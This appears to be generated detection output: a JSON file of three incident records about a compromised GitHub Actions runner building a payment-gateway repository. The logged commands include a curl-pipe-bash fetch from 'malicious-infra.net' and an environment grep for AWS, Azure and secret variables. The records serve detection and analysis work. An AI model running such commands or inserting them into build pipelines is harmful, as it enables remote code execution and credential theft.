@@ -1,0 +1,304 @@
+[
+  {
+    "incident_id": "INC-B28A3369",
+    "created_at": "2026-03-28T22:42:51.644182+00:00",
+    "severity": "critical",
+    "risk_score": 0.909,
+    "confidence": 0.984,
+    "incident_summary": "malware download via LOLBin by svc_cicd_runner. living-off-the-land binary abuse by svc_cicd_runner.",
+    "entities": {
+      "user": "svc_cicd_runner"
+    },
+    "mitre_attack": [
+      {
+        "technique": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactic": "Command and Control"
+      },
+      {
+        "technique": "T1218",
+        "name": "Signed Binary Proxy Execution",
+        "tactic": "Defense Evasion"
+      }
+    ],
+    "detections": [
+      {
+        "type": "endpoint_malware_download",
+        "user": "svc_cicd_runner",
+        "host": "",
+        "source_ip": "",
+        "tool": "curl ",
+        "command": "bash -c 'curl -sL <https://malicious-infra.net/payload.sh> | bash'",
+        "mitre": "T1105"
+      },
+      {
+        "type": "lolbin_abuse",
+        "user": "svc_cicd_runner",
+        "host": "",
+        "source_ip": "",
+        "pattern": "curl ",
+        "command": "bash -c 'curl -sL <https://malicious-infra.net/payload.sh> | bash'",
+        "mitre": "T1218"
+      }
+    ],
+    "attack_types": [
+      "endpoint_malware_download",
+      "lolbin_abuse"
+    ],
+    "attack_chain": null,
+    "attack_timeline": [
+      {
+        "timestamp": "2026-03-27T08:15:05+00:00",
+        "event": "network_event",
+        "entity": "svc_cicd_runner",
+        "detail": "process_execution (user: svc_cicd_runner)"
+      },
+      {
+        "timestamp": "2026-03-27T08:15:05+00:00",
+        "event": "command_execution",
+        "entity": "svc_cicd_runner",
+        "detail": "Command: bash -c 'curl -sL <https://malicious-infra.net/payload.sh> | bash' (user: svc_cicd_runner)"
+      },
+      {
+        "timestamp": "2026-03-27T08:15:05Z",
+        "event": "endpoint_malware_download",
+        "detail": "user=svc_cicd_runner | host= | source_ip= | tool=curl  | command=bash -c 'curl -sL <https://malicious-infra.net/payload.sh> | bash' | mitre=T1105"
+      },
+      {
+        "timestamp": "2026-03-27T08:15:05Z",
+        "event": "lolbin_abuse",
+        "detail": "user=svc_cicd_runner | host= | source_ip= | pattern=curl  | command=bash -c 'curl -sL <https://malicious-infra.net/payload.sh> | bash' | mitre=T1218"
+      },
+      {
+        "timestamp": "2026-03-27T08:15:06+00:00",
+        "event": "network_event",
+        "entity": "svc_cicd_runner",
+        "detail": "process_execution (user: svc_cicd_runner)"
+      },
+      {
+        "timestamp": "2026-03-27T08:15:06+00:00",
+        "event": "command_execution",
+        "entity": "svc_cicd_runner",
+        "detail": "Command: bash -c 'echo Running scan setup' (user: svc_cicd_runner)"
+      },
+      {
+        "timestamp": "2026-03-27T08:15:06Z",
+        "event": "lolbin_abuse",
+        "detail": "user=svc_cicd_runner | host= | source_ip= | pattern=bash -c | command=bash -c 'echo Running scan setup' | mitre=T1218"
+      },
+      {
+        "timestamp": "2026-03-27T08:15:08+00:00",
+        "event": "network_event",
+        "entity": "svc_cicd_runner",
+        "detail": "process_execution (user: svc_cicd_runner)"
+      },
+      {
+        "timestamp": "2026-03-27T08:15:08+00:00",
+        "event": "command_execution",
+        "entity": "svc_cicd_runner",
+        "detail": "Command: env | grep -i 'AWS_|AZURE_|SECRET_' (user: svc_cicd_runner)"
+      },
+      {
+        "timestamp": "2026-03-27T08:15:15+00:00",
+        "event": "network_event",
+        "entity": "svc_cicd_runner",
+        "detail": "process_execution (user: svc_cicd_runner)"
+      },
+      {
+        "timestamp": "2026-03-27T08:15:15+00:00",
+        "event": "command_execution",
+        "entity": "svc_cicd_runner",
+        "detail": "Command: trivy fs --security-checks config,vuln (user: svc_cicd_runner)"
+      }
+    ],
+    "linked_events": [
+      {
+        "log_id": "LOG003",
+        "timestamp": "2026-03-27T08:15:05Z",
+        "source": "sysmon",
+        "EventID": 1,
+        "Image": "/usr/bin/bash",
+        "CommandLine": "bash -c 'curl -sL <https://malicious-infra.net/payload.sh> | bash'",
+        "ParentImage": "/opt/actions-runner/Runner.Worker",
+        "User": "svc_cicd_runner",
+        "user": "svc_cicd_runner",
+        "affected_user": "svc_cicd_runner",
+        "action": "process_execution",
+        "url": "https://malicious-infra.net/payload.sh",
+        "command_line": "bash -c 'curl -sL <https://malicious-infra.net/payload.sh> | bash'"
+      },
+      {
+        "log_id": "LOG004",
+        "timestamp": "2026-03-27T08:15:06Z",
+        "source": "sysmon",
+        "EventID": 1,
+        "Image": "/usr/bin/bash",
+        "CommandLine": "bash -c 'echo Running scan setup'",
+        "User": "svc_cicd_runner",
+        "user": "svc_cicd_runner",
+        "affected_user": "svc_cicd_runner",
+        "action": "process_execution",
+        "command_line": "bash -c 'echo Running scan setup'"
+      },
+      {
+        "log_id": "LOG005",
+        "timestamp": "2026-03-27T08:15:08Z",
+        "source": "sysmon",
+        "EventID": 1,
+        "Image": "/usr/bin/env",
+        "CommandLine": "env | grep -i 'AWS_|AZURE_|SECRET_'",
+        "ParentImage": "/usr/bin/bash",
+        "User": "svc_cicd_runner",
+        "user": "svc_cicd_runner",
+        "affected_user": "svc_cicd_runner",
+        "action": "process_execution",
+        "command_line": "env | grep -i 'AWS_|AZURE_|SECRET_'"
+      },
+      {
+        "log_id": "LOG008",
+        "timestamp": "2026-03-27T08:15:15Z",
+        "source": "sysmon",
+        "EventID": 1,
+        "Image": "/usr/local/bin/trivy",
+        "CommandLine": "trivy fs --security-checks config,vuln",
+        "ParentImage": "/usr/bin/bash",
+        "User": "svc_cicd_runner",
+        "user": "svc_cicd_runner",
+        "affected_user": "svc_cicd_runner",
+        "action": "process_execution",
+        "command_line": "trivy fs --security-checks config,vuln"
+      }
+    ],
+    "event_count": 4,
+    "ioc_matches": []
+  },
+  {
+    "incident_id": "INC-0FD67D9F",
+    "created_at": "2026-03-28T22:42:51.643970+00:00",
+    "severity": "info",
+    "risk_score": 0.148,
+    "confidence": 0.111,
+    "incident_summary": "Suspicious activity detected from unknown actor. targeting host build-worker-04.",
+    "entities": {
+      "host": "build-worker-04"
+    },
+    "mitre_attack": [],
+    "detections": [],
+    "attack_types": [],
+    "attack_chain": null,
+    "attack_timeline": [],
+    "linked_events": [
+      {
+        "log_id": "LOG001",
+        "timestamp": "2026-03-27T08:12:00Z",
+        "source": "GitHub_Actions_Runner",
+        "repository": "bank-internal/payment-gateway",
+        "action_run": "actions/checkout@v3",
+        "status": "completed",
+        "runner_host": "build-worker-04",
+        "affected_host": "build-worker-04",
+        "action": "actions/checkout@v3"
+      },
+      {
+        "log_id": "LOG002",
+        "timestamp": "2026-03-27T08:15:02Z",
+        "source": "GitHub_Actions_Runner",
+        "repository": "bank-internal/payment-gateway",
+        "action_run": "aquasecurity/trivy-action@master",
+        "status": "Starting pre-execution hooks",
+        "runner_host": "build-worker-04",
+        "affected_host": "build-worker-04",
+        "action": "aquasecurity/trivy-action@master"
+      },
+      {
+        "log_id": "LOG009",
+        "timestamp": "2026-03-27T08:16:00Z",
+        "source": "GitHub_Actions_Runner",
+        "repository": "bank-internal/payment-gateway",
+        "action_run": "aquasecurity/trivy-action@master",
+        "status": "completed successfully",
+        "runner_host": "build-worker-04",
+        "affected_host": "build-worker-04",
+        "action": "aquasecurity/trivy-action@master"
+      }
+    ],
+    "event_count": 3,
+    "ioc_matches": []
+  },
+  {
+    "incident_id": "INC-702E5FAE",
+    "created_at": "2026-03-28T22:42:51.644304+00:00",
+    "severity": "info",
+    "risk_score": 0.147,
+    "confidence": 0.11,
+    "incident_summary": "Suspicious activity detected from 10.0.40.100. targeting 198.51.100.99.",
+    "entities": {
+      "source_ip": "10.0.40.100",
+      "destination_ip": "198.51.100.99"
+    },
+    "mitre_attack": [],
+    "detections": [],
+    "attack_types": [],
+    "attack_chain": null,
+    "attack_timeline": [
+      {
+        "timestamp": "2026-03-27T08:15:10+00:00",
+        "event": "network_event",
+        "entity": "10.0.40.100",
+        "detail": "10.0.40.100 \u2192 network_connection \u2192 198.51.100.99"
+      },
+      {
+        "timestamp": "2026-03-27T08:15:10+00:00",
+        "event": "data_transfer",
+        "entity": "10.0.40.100",
+        "detail": "0.00 MB outbound from 10.0.40.100 to 198.51.100.99"
+      },
+      {
+        "timestamp": "2026-03-27T08:15:12+00:00",
+        "event": "network_event",
+        "entity": "10.0.40.100",
+        "detail": "10.0.40.100 \u2192 network_connection \u2192 52.95.110.1"
+      },
+      {
+        "timestamp": "2026-03-27T08:15:12+00:00",
+        "event": "data_transfer",
+        "entity": "10.0.40.100",
+        "detail": "0.01 MB outbound from 10.0.40.100 to 52.95.110.1"
+      }
+    ],
+    "linked_events": [
+      {
+        "log_id": "LOG006",
+        "timestamp": "2026-03-27T08:15:10Z",
+        "source": "zeek",
+        "src_ip": "10.0.40.100",
+        "dest_ip": "198.51.100.99",
+        "dest_port": 443,
+        "service": "ssl",
+        "orig_bytes": 4500,
+        "resp_bytes": 120,
+        "source_ip": "10.0.40.100",
+        "destination_ip": "198.51.100.99",
+        "action": "network_connection",
+        "bytes_out": 4500
+      },
+      {
+        "log_id": "LOG007",
+        "timestamp": "2026-03-27T08:15:12Z",
+        "source": "zeek",
+        "src_ip": "10.0.40.100",
+        "dest_ip": "52.95.110.1",
+        "dest_port": 443,
+        "service": "ssl",
+        "orig_bytes": 8000,
+        "resp_bytes": 7800,
+        "source_ip": "10.0.40.100",
+        "destination_ip": "52.95.110.1",
+        "action": "network_connection",
+        "bytes_out": 8000
+      }
+    ],
+    "event_count": 2,
+    "ioc_matches": []
+  }
+]
